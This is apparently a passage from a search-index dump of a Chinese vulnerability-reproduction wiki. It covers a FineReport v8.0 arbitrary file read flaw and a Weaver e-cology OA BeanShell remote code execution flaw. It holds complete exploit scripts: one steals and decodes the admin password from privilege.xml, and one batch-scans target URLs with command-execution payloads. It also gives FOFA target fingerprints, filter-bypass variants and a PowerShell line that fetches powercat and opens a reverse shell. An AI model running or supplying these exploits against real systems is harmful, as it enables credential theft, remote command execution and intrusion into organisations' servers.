\u8bbf\u95eePOC\u4e3a,\u8bfb\u53d6\u5bc6\u7801\u6587\u4ef6 privilege.xml /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml \u4f7f\u7528\u89e3\u5bc6\u811a\u672c\u89e3\u5bc6\u6587\u4ef6 \u5f97\u5230\u5bc6\u7801\uff0c\u5373\u53ef\u767b\u9646\u540e\u53f0\u7cfb\u7edf\uff0c\u8d26\u6237\u4e3a admin \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u5e06\u8f6f\u62a5\u8868 v8.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def decode_passwd ( cipher ): PASSWORD_MASK_ARRAY = [ 19 , 78 , 10 , 15 , 100 , 213 , 43 , 23 ] # \u63a9\u7801 Password = \"\" cipher = cipher [ 3 :] # \u622a\u65ad\u4e09\u4f4d\u540e for i in range ( int ( len ( cipher ) / 4 )): c1 = int ( \"0x\" + cipher [ i * 4 :( i + 1 ) * 4 ], 16 ) c2 = c1 ^ PASSWORD_MASK_ARRAY [ i % 8 ] Password = Password + chr ( c2 ) return Password def POC_1 ( target_url ): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response_1 = requests . get ( url = vuln_url_1 , timeout = 5 , verify = False , headers = headers ) response_2 = requests . get ( url = vuln_url_2 , timeout = 5 , verify = False , headers = headers ) if \"\u90e8\u7f72\u9875\u9762\" in response_1 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u90e8\u7f72\u9875\u9762\u4e3a: {} \\033 [0m\" . format ( vuln_url_1 )) POC_2 ( vuln_url_1 ) elif \"\u90e8\u7f72\u9875\u9762\" in response_2 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u90e8\u7f72\u9875\u9762\u4e3a: {} \\033 [0m\" . format ( vuln_url_2 )) POC_2 ( vuln_url_2 ) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_2 ( vuln_url_fileread ): vuln_url = vuln_url_fileread + \"?op=chart&cmd=get_geo_json&resourcepath=privilege.xml\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bbf\u95ee: {} \\033 [0m\" . format ( vuln_url )) if \"rootManagerPassword\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807\u5b58\u5728\u6f0f\u6d1e,\u8bfb\u53d6\u654f\u611f\u6587\u4ef6 \\n {} \\033 [0m\" . format ( response . text )) user_name = re . findall ( r '<!\\[CDATA\\[(.*?)]]></rootManagerName>' , response . text ) cipher = re . findall ( r '<!\\[CDATA\\[(.*?)]]></rootManagerPassword>' , response . text ) password = decode_passwd ( cipher [ 0 ]) print ( \" \\033 [34m[o] \u540e\u53f0\u8d26\u6237\u5bc6\u7801\u4e3a: {} {} \\033 [0m\" . format ( user_name [ 0 ], password )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d FineReport_v8.0_Arbitrary_file_read_","title":"\u5e06\u8f6f\u62a5\u8868 v8.0 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2018-04757"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#\u5e06\u8f6f\u62a5\u8868-v80-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e-cnvd-2018-04757","text":"","title":"\u5e06\u8f6f\u62a5\u8868 v8.0 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2018-04757"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#\u6f0f\u6d1e\u63cf\u8ff0","text":"FineReport\u62a5\u8868\u8f6f\u4ef6\u662f\u4e00\u6b3e\u7eafJava\u7f16\u5199\u7684\uff0c\u96c6\u6570\u636e\u5c55\u793a(\u62a5\u8868)\u548c\u6570\u636e\u5f55\u5165(\u8868\u5355)\u529f\u80fd\u4e8e\u4e00\u8eab\u7684\u4f01\u4e1a\u7ea7web\u62a5\u8868\u5de5\u5177\u3002 FineReport v8.0\u7248\u672c\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u6f0f\u6d1e\u8bfb\u53d6\u7f51\u7ad9\u4efb\u610f\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] FineReport < v8.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#fofa","text":"[!NOTE] body=\"isSupportForgetPwd\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#\u6f0f\u6d1e\u590d\u73b0","text":"\u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a fr-applet-8.0.jar package com.fr.chart.web ; import com.fr.base.FRContext ; import com.fr.general.IOUtils ; import com.fr.stable.CodeUtils ; import com.fr.web.core.ActionNoSessionCMD ; import com.fr.web.utils.WebUtils ; import java.io.InputStream ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction () { } public void actionCMD ( HttpServletRequest var1 , HttpServletResponse var2 , String var3 ) throws Exception { String var4 = CodeUtils . cjkDecode ( WebUtils . getHTTPRequestParameter ( var1 , \"resourcepath\" )); if ( ! WebUtils . invalidResourcePath ( var4 )) { InputStream var5 = FRContext . getCurrentEnv (). readResource ( var4 ); String var6 = IOUtils . inputStream2String ( var5 ); var6 = var6 . replace ( '\\ufeff' , ' ' ); WebUtils . printAsString ( var2 , var6 ); } } public String getCMD () { return \"get_geo_json\" ; } } \u4f7f\u7528request\u5c06\u6587\u4ef6\u540d\u4f20\u5165 \u8c03\u7528cjkDecode\u51fd\u6570\u89e3\u5bc6\u6587\u4ef6\u540d \u4f7f\u7528invalidResourcePath\u51fd\u6570\u6821\u9a8c\u6587\u4ef6\u662f\u5426\u5b58\u5728 \u6700\u540e\u4f7f\u7528readResource\u51fd\u6570\u8bfb\u53d6\u6587\u4ef6\u4f20\u8f93\u5230\u6d4f\u89c8\u5668\u4e0a \u9ed8\u8ba4\u76ee\u5f55\u4e3aresources \u5176\u4e2d\u7684privilege.xml\u91cc\u9762\u5b58\u50a8\u4e86\u540e\u53f0\u7684\u7528\u6237\u540d\u5bc6\u7801 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <PrivilegeManager xmlVersion= \"20170715\" releaseVersion= \"8.0.0\" fsSystemManagerPassSet= \"true\" birthday= \"0\" male= \"false\" > <rootManagerName> <![CDATA[admin]]> </rootManagerName> <rootManagerPassword> <![CDATA[___00520017004e002b004100b7004200250023007f003d003d005400e4001c0057]]> </rootManagerPassword> <AP class= \"com.fr.privilege.providers.NoAuthenticationProvider\" /> <ForwardUrl> <![CDATA[${servletURL}?op=fr_platform]]> </ForwardUrl> <PVFILTER class= \"com.fr.fs.privilege.auth.BasePrivilegeFilter\" /> </PrivilegeManager> [!NOTE] \u52a0\u5bc6\u51fd\u6570 public static String passwordEncode ( String var0 ) { StringBuilder var1 = new StringBuilder (); var1 . append ( \"___\" ); if ( var0 == null ) { return var1 . toString (); } else { int var2 = 0 ; for ( int var3 = 0 ; var3 < var0 . length (); ++ var3 ) { if ( var2 == PASSWORD_MASK_ARRAY . length ) { var2 = 0 ; } int var4 = var0 . charAt ( var3 ) ^ PASSWORD_MASK_ARRAY [ var2 ] ; String var5 = Integer . toHexString ( var4 ); int var6 = var5 . length (); for ( int var7 = 0 ; var7 < 4 - var6 ; ++ var7 ) { var5 = \"0\" + var5 ; } var1 . append ( var5 ); ++ var2 ; } return var1 . toString (); } } [!NOTE] \u89e3\u5bc6\u51fd\u6570 public static String passwordDecode ( String var0 ) { if ( var0 != null && var0 . startsWith ( \"___\" )) { var0 = var0 . substring ( 3 ); StringBuilder var1 = new StringBuilder (); int var2 = 0 ; for ( int var3 = 0 ; var3 <= var0 . length () - 4 ; var3 += 4 ) { if ( var2 == PASSWORD_MASK_ARRAY . length ) { var2 = 0 ; } String var4 = var0 . substring ( var3 , var3 + 4 ); int var5 = Integer . parseInt ( var4 , 16 ) ^ PASSWORD_MASK_ARRAY [ var2 ] ; var1 . append (( char ) var5 ); ++ var2 ; } var0 = var1 . toString (); } return var0 ; } \u4f7f\u7528python\u5199\u51fa\u7684\u89e3\u5bc6\u4ee3\u7801\u4e3a cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #\u5bc6\u6587 PASSWORD_MASK_ARRAY = [ 19 , 78 , 10 , 15 , 100 , 213 , 43 , 23 ] #\u63a9\u7801 Password = \"\" cipher = cipher [ 3 :] #\u622a\u65ad\u4e09\u4f4d\u540e for i in range ( int ( len ( cipher ) / 4 )): c1 = int ( \"0x\" + cipher [ i * 4 :( i + 1 ) * 4 ], 16 ) c2 = c1 ^ PASSWORD_MASK_ARRAY [ i % 8 ] Password = Password + chr ( c2 ) print ( Password ) \u8fd9\u91cc\u4f7f\u7528\u4e0a\u9762\u8bb2\u8ff0\u7684\u539f\u7406\u8fdb\u884c\u590d\u73b0,\u8bbf\u95ee\u76ee\u6807 [!NOTE] \u8def\u5f84\u5206\u4e3a\u4e24\u79cd /WebReport/ReportServer ReportServer \u8bbf\u95eePOC\u4e3a,\u8bfb\u53d6\u5bc6\u7801\u6587\u4ef6 privilege.xml /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml \u4f7f\u7528\u89e3\u5bc6\u811a\u672c\u89e3\u5bc6\u6587\u4ef6 \u5f97\u5230\u5bc6\u7801\uff0c\u5373\u53ef\u767b\u9646\u540e\u53f0\u7cfb\u7edf\uff0c\u8d26\u6237\u4e3a admin","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u5e06\u8f6f\u62a5\u8868 v8.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def decode_passwd ( cipher ): PASSWORD_MASK_ARRAY = [ 19 , 78 , 10 , 15 , 100 , 213 , 43 , 23 ] # \u63a9\u7801 Password = \"\" cipher = cipher [ 3 :] # \u622a\u65ad\u4e09\u4f4d\u540e for i in range ( int ( len ( cipher ) / 4 )): c1 = int ( \"0x\" + cipher [ i * 4 :( i + 1 ) * 4 ], 16 ) c2 = c1 ^ PASSWORD_MASK_ARRAY [ i % 8 ] Password = Password + chr ( c2 ) return Password def POC_1 ( target_url ): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response_1 = requests . get ( url = vuln_url_1 , timeout = 5 , verify = False , headers = headers ) response_2 = requests . get ( url = vuln_url_2 , timeout = 5 , verify = False , headers = headers ) if \"\u90e8\u7f72\u9875\u9762\" in response_1 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u90e8\u7f72\u9875\u9762\u4e3a: {} \\033 [0m\" . format ( vuln_url_1 )) POC_2 ( vuln_url_1 ) elif \"\u90e8\u7f72\u9875\u9762\" in response_2 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u90e8\u7f72\u9875\u9762\u4e3a: {} \\033 [0m\" . format ( vuln_url_2 )) POC_2 ( vuln_url_2 ) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_2 ( vuln_url_fileread ): vuln_url = vuln_url_fileread + \"?op=chart&cmd=get_geo_json&resourcepath=privilege.xml\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bbf\u95ee: {} \\033 [0m\" . format ( vuln_url )) if \"rootManagerPassword\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807\u5b58\u5728\u6f0f\u6d1e,\u8bfb\u53d6\u654f\u611f\u6587\u4ef6 \\n {} \\033 [0m\" . format ( response . text )) user_name = re . findall ( r '<!\\[CDATA\\[(.*?)]]></rootManagerName>' , response . text ) cipher = re . findall ( r '<!\\[CDATA\\[(.*?)]]></rootManagerPassword>' , response . text ) password = decode_passwd ( cipher [ 0 ]) print ( \" \\033 [34m[o] \u540e\u53f0\u8d26\u6237\u5bc6\u7801\u4e3a: {} {} \\033 [0m\" . format ( user_name [ 0 ], password )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d FineReport_v8.0_Arbitrary_file_read_","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/","text":"\u6cdb\u5faeOA Bsh \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CNVD-2019-32204 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2019\u5e749\u670817\u65e5\u6cdb\u5faeOA\u5b98\u65b9\u66f4\u65b0\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u8865\u4e01, \u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd. FOFA \u00b6 [!NOTE] app=\u201c\u6cdb\u5fae-\u534f\u540c\u529e\u516cOA\u201d \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u76f4\u63a5\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u540e\u52a0\u5165\u7ec4\u4ef6\u8bbf\u95ee\u8def\u5f84 /weaver/bsh.servlet.BshServlet/\uff0c\u5982\u4e0b\u56fe\u5728victim\u4e0a\u6267\u884c\u4e86\u547d\u4ee4\u201cwhoami\u201d \u8bf7\u6c42\u5305\u4e3a POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 ( compatible ; MSIE 9 .0 ; Windows NT 6 .1 ; Win64 ; x64 ; Trident/5.0 ) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script = ex \\u 0065c ( \"cmd /c dir\" ) ;& bsh.servlet.captureOutErr = true & bsh.servlet.output = raw \u5173\u4e8e\u7ed5\u8fc7 \u00b6 eval%00 ( \"ex\" %2b \"ec(\\\"whoami\\\")\" ) ; ex \\u 0065c ( \"cmd /c dir\" ) ; IEX ( New-Object System.Net.Webclient ) .DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) ; powercat -c ip -p 6666 -e cmd \u6f0f\u6d1ePOC \u00b6 https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) import requests , sys headers = { 'Content-Type' : 'text/xml; charset=utf-8' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0' , 'Cache-Control' : 'max-age=0' , 'Content-Type' : 'application/x-www-form-urlencoded' , 'Upgrade-Insecure-Requests' : '1' , 'Content-Length' : '578' } proxies = { 'http' : 'http://127.0.0.1:8080' } def Poc_check ( target ): Url_Payload1 = \"/bsh.servlet.BshServlet\" Url_Payload2 = \"/weaver/bsh.servlet.BshServlet\" Url_Payload3 = \"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4 = \"/oa/bsh.servlet.BshServlet\" Data_Payload1 = \"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2 = \"\"\"bsh.script= \\u0065\\u0078\\u0065\\u0063 (\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3 = \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter( \\\\ \"command \\\\ \"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in ( Url_Payload1 , Url_Payload2 , Url_Payload3 , Url_Payload4 ): url = target + Url_Payload for Data_payload in ( Data_Payload1 , Data_Payload2 , Data_Payload3 ): try : http_response = requests . post ( url , data = Data_payload , headers = headers , verify = False ) #print http_response.status_code if http_response . status_code == 200 : if \";</script>\" not in ( http_response . content ): if \"Login.jsp\" not in ( http_response . content ): if \"Error\" not in ( http_response . content ): print \" {0} is a E-cologyOA_RCE Vulnerability\" . format ( url ) print \"Server Current Username\uff1a {0} \" . format ( http_response . content ) elif http_response . status_code == 500 : print \" {0} 500 maybe is Weaver-EcologyOA\uff0cPlease confirm by yourself \" . format ( url ) else : pass except Exception , Error : pass if __name__ == '__main__' : for line in open ( sys . argv [ 1 ]) . readlines (): target = line . strip () Poc_check ( target ) #1.install python Dependencies Library pip install requests #2.\u6279\u91cf\u811a\u672c \u6267\u884c python Weaver-Ecology-OA_RCE-exp.py url.txt\u6587\u4ef6\u4e2d \u662furl\u5730\u5740 \u9700\u8981\u5e26http\u534f\u8bae \u6709\u4efb\u4f55\u95ee\u9898\u8bf7issue","title":"\u6cdb\u5faeOA Bsh \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CNVD-2019-32204"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#\u6cdb\u5faeoa-bsh-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cnvd-2019-32204","text":"","title":"\u6cdb\u5faeOA Bsh \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CNVD-2019-32204"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2019\u5e749\u670817\u65e5\u6cdb\u5faeOA\u5b98\u65b9\u66f4\u65b0\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u8865\u4e01, \u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd.","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#fofa","text":"[!NOTE] app=\u201c\u6cdb\u5fae-\u534f\u540c\u529e\u516cOA\u201d","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#\u6f0f\u6d1e\u590d\u73b0","text":"\u76f4\u63a5\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u540e\u52a0\u5165\u7ec4\u4ef6\u8bbf\u95ee\u8def\u5f84 /weaver/bsh.servlet.BshServlet/\uff0c\u5982\u4e0b\u56fe\u5728victim\u4e0a\u6267\u884c\u4e86\u547d\u4ee4\u201cwhoami\u201d \u8bf7\u6c42\u5305\u4e3a POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 ( compatible ; MSIE 9 .0 ; Windows NT 6 .1 ; Win64 ; x64 ; Trident/5.0 ) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script = ex \\u 0065c ( \"cmd /c dir\" ) ;& bsh.servlet.captureOutErr = true & bsh.servlet.output = raw","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#\u5173\u4e8e\u7ed5\u8fc7","text":"eval%00 ( \"ex\" 